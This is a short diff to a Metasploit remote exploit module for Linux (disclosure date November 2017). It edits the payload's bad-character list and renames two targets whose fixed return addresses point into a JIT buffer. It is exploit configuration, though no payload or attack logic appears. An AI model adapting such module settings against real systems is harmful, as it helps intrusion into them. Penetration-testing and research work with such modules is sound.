@@ -24,13 +24,13 @@ class MetasploitModule < Msf::Exploit::Remote
       'Payload'        =>
         {
           'Space'    => 1024,
-          'BadChars' => "\x00\x20\x0a\x0d\x0b\xff",
+          'BadChars' => "\x00\x20\x0a\x0d\x0b\x0c\x09",
         },
       'Platform'       => 'linux',
       'Targets'        =>
         [
-          [ 'ijit 64-bit target', { 'Ret' => 0x3badc040 } ],
-          [ 'ijit 64-bit nop middle', { 'Ret' => 0x3badc240 } ],
+          [ 'ijit buffer start', { 'Ret' => 0x3badc040 } ],
+          [ 'ijit sled middle', { 'Ret' => 0x3badc240 } ],
         ],
       'DefaultTarget'  => 0,
       'DisclosureDate' => 'November 2017'))
